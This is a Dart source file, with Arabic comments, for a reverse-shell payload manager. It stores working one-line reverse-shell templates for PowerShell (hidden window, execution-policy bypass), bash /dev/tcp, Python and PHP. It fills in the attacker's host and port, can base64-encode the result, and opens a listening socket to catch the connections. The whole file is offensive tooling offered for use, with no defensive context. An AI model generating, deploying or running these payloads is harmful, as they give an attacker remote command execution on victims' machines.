import 'dart:async';
import 'dart:io';
import 'dart:convert';
import 'dart:math';

class UltimatePayloadManagerSystem {
  final Map<String, Map<String, dynamic>> _payloadDatabase = {};
  final List<Map<String, dynamic>> _generatedPayloads = [];

  /// تسجيل حمولة جديدة
  void registerPayload({
    required String name,
    required String platform,
    required String type,
    required String template,
    Map<String, String>? options,
  }) {
    _payloadDatabase[name] = {
      'name': name,
      'platform': platform,
      'type': type,
      'template': template,
      'options': options ?? {},
      'times_used': 0,
    };
  }

  /// توليد حمولة مخصصة
  Map<String, dynamic> generatePayload({
    required String payloadName,
    required String lhost,
    int lport = 4444,
    Map<String, String>? customOptions,
  }) {
    final payload = _payloadDatabase[payloadName];
    if (payload == null) return {'error': 'Payload not found'};

    String generated = payload['template'] as String;

    // استبدال المتغيرات
    generated = generated.replaceAll('LHOST', lhost);
    generated = generated.replaceAll('LPORT', lport.toString());

    if (customOptions != null) {
      for (final entry in customOptions.entries) {
        generated = generated.replaceAll(entry.key, entry.value);
      }
    }

    // تشفير الحمولة (اختياري)
    if (customOptions?['encode'] == 'true') {
      generated = base64Encode(utf8.encode(generated));
    }

    payload['times_used']++;

    final generatedPayload = {
      'name': payloadName,
      'platform': payload['platform'],
      'type': payload['type'],
      'payload': generated,
      'lhost': lhost,
      'lport': lport,
      'generated_at': DateTime.now().toIso8601String(),
    };

    _generatedPayloads.add(generatedPayload);
    return generatedPayload;
  }

  /// إنشاء مستمع (Listener)
  Future<Map<String, dynamic>> startListener({
    required String payloadType,
    int port = 4444,
    String host = '0.0.0.0',
  }) async {
    try {
      final server = await ServerSocket.bind(InternetAddress(host), port);

      return {
        'success': true,
        'type': payloadType,
        'host': host,
        'port': port,
        'status': 'listening',
        'server': server,
      };
    } catch (e) {
      return {'success': false, 'error': e.toString()};
    }
  }

  /// تهيئة الحمولات الافتراضية
  void initializeDefaultPayloads() {
    // Windows Payloads
    registerPayload(name: 'windows/x64/meterpreter/reverse_tcp', platform: 'Windows', type: 'shell', template: 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "\$c=New-Object System.Net.Sockets.TCPClient(\'LHOST\',LPORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$sb=(iex \$d 2>&1|Out-String);\$sb2=\$sb + \'PS \' + (pwd).Path + \'> \';\$sbt=([text.encoding]::ASCII).GetBytes(\$sb2);\$s.Write(\$sbt,0,\$sbt.Length);\$s.Flush()};\$c.Close()"');

    // Linux Payloads
    registerPayload(name: 'linux/x86/shell/reverse_tcp', platform: 'Linux', type: 'shell', template: 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1');

    // Python Payloads
    registerPayload(name: 'python/meterpreter/reverse_tcp', platform: 'Multi', type: 'shell', template: 'python3 -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'LHOST\',LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\',\'-i\'])"');

    // PHP Payloads
    registerPayload(name: 'php/meterpreter/reverse_tcp', platform: 'Multi', type: 'shell', template: 'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'');
  }

  Map<String, dynamic> getStats() {
    return {
      'total_payloads': _payloadDatabase.length,
      'generated': _generatedPayloads.length,
      'most_used': _getMostUsed(),
    };
  }

  String? _getMostUsed() {
    if (_payloadDatabase.isEmpty) return null;
    return _payloadDatabase.values.reduce((a, b) => (a['times_used'] as int) > (b['times_used'] as int) ? a : b)['name'];
  }
}
